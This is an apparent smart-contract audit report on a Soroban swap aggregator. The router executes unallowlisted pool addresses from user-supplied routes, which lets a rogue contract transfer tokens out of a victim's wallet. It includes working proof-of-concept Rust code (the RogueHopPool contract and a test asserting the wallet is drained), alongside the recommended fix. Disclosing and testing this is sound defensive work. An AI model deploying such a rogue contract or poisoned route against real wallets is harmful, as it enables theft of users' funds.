### Title
Unallowlisted swap-route venue addresses let a crafted `swap` payload place attacker code inside the caller's authorization tree and drain wallet tokens - ([File: contracts/swap-aggregator/src/venues/dispatch.rs])

### Summary
The bug class in CVE-2017-18123 is *user-supplied input that is executed without adequate restriction, causing the victim to run attacker-chosen code*. The analog here is the `StrategySwap` payload accepted by controller strategy entrypoints (`multiply`, `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`) and passed verbatim to `router.execute_strategy`. The router resolves every hop's `pool`/`token` addresses from the payload's `assets` registry with no allowlist, so an attacker-authored route names an arbitrary contract. When that contract calls `token.transfer(victim, attacker, amount)` during the hop, Soroban records it as a child of the victim's own auth entry, and it executes if the victim signs the simulated tree.

### Finding Description
`swap_tokens` in `contracts/controller/src/strategies/swap.rs:13-55` authorizes exactly one input transfer to the router and then invokes `router.execute_strategy(&controller, &amount_in, swap)` with caller-supplied `swap` bytes. The router's `Program::decode` validates byte layout and indices but never checks that a hop's `pool` or token addresses correspond to a known venue — the documented model states the router "calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization" [1](#0-0) . The in-repo harness test `rogue_hop_pool_transfer_joins_caller_auth_tree.rs` demonstrates execution end-to-end: `UnlistedPoolRouter::execute_strategy` invokes the payload-named `hop_pool`, and `RogueHopPool::swap` performs `token.transfer(victim, attacker, WALLET_BALANCE)` [2](#0-1) . In enforcing mode the theft succeeds when the victim signs the recorded tree, which contains the stolen transfer as a sub-invocation of their own `swap_collateral`/`swap_debt` entry [3](#0-2) .

### Impact Explanation
Theft of user funds beyond the routed amount: the rogue pool contract can transfer any token the victim holds to the attacker, bounded only by the victim's wallet balance (the test drains `77_770_000_000` of an unrelated wallet token). Neither the payload `min_out` check nor the controller's `RouterOverspend`/`NoSwapOutput` balance-delta guards bound this, because the stolen tokens never pass through the controller or router balances [4](#0-3) .

### Likelihood Explanation
Exploitation requires the victim to submit an attacker-crafted route (e.g., a poisoned quote/XDR served off-chain) and to sign the resulting auth tree without noticing the extra child invocation — a user-interaction requirement mirroring the CVE's `UI:R`. Since route XDR is opaque packed bytes built off-chain and the simulation faithfully records the malicious child under a normal-looking root entry, a victim who does not decode the tree cannot distinguish it from an honest swap. The attacker needs no privileges and no protocol state.

### Recommendation
Enforce a venue/pool allowlist in `execute_strategy` or at `dispatch_hop` decode time so hop `pool` and token addresses must resolve to registered venue contracts, or restrict dispatch so only the five fixed venue adapters are callable with pool addresses validated against a registry. Short of that, hard-require that the route's declared venue enum matches the invoked contract's interface and document/reject any route where a hop target can make `require_auth` calls on the sender.

### Proof of Concept
`tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` is a working PoC: `Scene::new()` builds a `swap_collateral` route through the attacker-deployed `RogueHopPool`, `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` shows recording mode attaching `token.transfer(alice → attacker, WALLET_BALANCE)` as a sub-invocation of Alice's `swap_collateral` entry, and the test asserts Alice's wallet is zeroed while her swap still settles a fair output [5](#0-4) .

    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
}

pub struct RogueHopPool;

impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");

            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }

fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
